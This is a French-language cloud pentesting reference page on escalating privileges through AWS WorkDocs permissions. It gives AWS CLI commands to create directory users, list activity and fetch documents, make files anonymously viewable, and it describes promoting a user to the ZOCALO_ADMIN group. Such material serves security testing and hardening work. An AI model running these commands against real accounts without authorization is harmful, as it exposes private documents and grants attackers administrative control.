# AWS - Privilège d'escalade WorkDocs

## WorkDocs

Pour plus d'informations sur WorkDocs, consultez :

{% content-ref url="../../aws-pentesting/aws-services/aws-directory-services-workdocs-enum.md" %}
[aws-directory-services-workdocs-enum.md](../../aws-pentesting/aws-services/aws-directory-services-workdocs-enum.md)
{% endcontent-ref %}

### `workdocs:CreateUser`

Créez un utilisateur dans le répertoire indiqué, puis vous aurez accès à la fois à WorkDocs et à AD :

```bash
# Créer un utilisateur (créé dans AD)
aws workdocs create-user --username testingasd --given-name testingasd --surname testingasd --password <password> --email-address name@directory.domain --organization-id <directory-id>
```

### `workdocs:GetDocument`, `(workdocs:`DescribeActivities`)`

Les fichiers peuvent contenir des informations sensibles, lisez-les :

```bash
# Obtenir ce qui a été créé dans le répertoire
aws workdocs describe-activities --organization-id <directory-id>

# Obtenir ce que chaque utilisateur a créé
aws workdocs describe-activities --user-id "S-1-5-21-377..."

# Obtenir le fichier (une URL pour accéder au contenu sera récupérée)
aws workdocs get-document --document-id <doc-id>
```

### `workdocs:AddResourcePermissions`

Si vous n'avez pas accès à la lecture de quelque chose, vous pouvez simplement l'accorder

```bash
# Ajouter une autorisation pour que tout le monde puisse voir le fichier
aws workdocs add-resource-permissions --resource-id <id> --principals Id=anonymous,Type=ANONYMOUS,Role=VIEWER
## Cela donnera un identifiant, le fichier sera accessible dans : https://<name>.awsapps.com/workdocs/index.html#/share/document/<id>
```

### `workdocs:AddUserToGroup`

Vous pouvez rendre un utilisateur administrateur en le plaçant dans le groupe ZOCALO_ADMIN.\
Pour cela, suivez les instructions de [https://docs.aws.amazon.com/workdocs/latest/adminguide/manage\_set\_admin.html](https://docs.aws.amazon.com/workdocs/latest/adminguide/manage\_set\_admin.html)

Connectez-vous avec cet utilisateur dans Workdoc et accédez au panneau d'administration dans `/workdocs/index.html#/admin`

Je n'ai trouvé aucun moyen de le faire à partir de la ligne de commande.